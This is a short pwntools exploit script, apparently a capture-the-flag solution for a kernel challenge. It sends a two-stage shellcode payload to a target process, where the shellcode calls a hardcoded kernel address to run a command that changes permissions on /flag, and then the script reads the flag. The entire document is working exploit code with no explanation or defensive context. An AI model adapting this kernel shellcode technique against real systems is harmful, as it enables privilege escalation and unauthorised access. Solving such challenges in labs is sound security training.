#!/bin/python

import os 
import sys
import fcntl
from pwn import * 

context.arch = 'amd64'

RUNCMD_ADDR = 0xffffffff81089b30
MEM_START = 0x31337000


shellcode = f'''
    lea rdi, [rip+binsh]
    mov rax, {RUNCMD_ADDR}
    call rax
    ret

binsh:
    .string "./bin/chmod 007 /flag"    
'''
sc_asm = asm(shellcode)

boot_sc_asm  = asm(shellcraft.write(3, MEM_START+0x30, len(sc_asm)))
boot_sc_asm += cyclic(0x30 - len(boot_sc_asm))

proc = process(sys.argv[1])
proc.send(boot_sc_asm + sc_asm)

time.sleep(0.5)
try:
    with open("/flag", 'r') as flag:
        print(flag.read())
except Exception as ex:
    print("Exception:: " + str(ex))

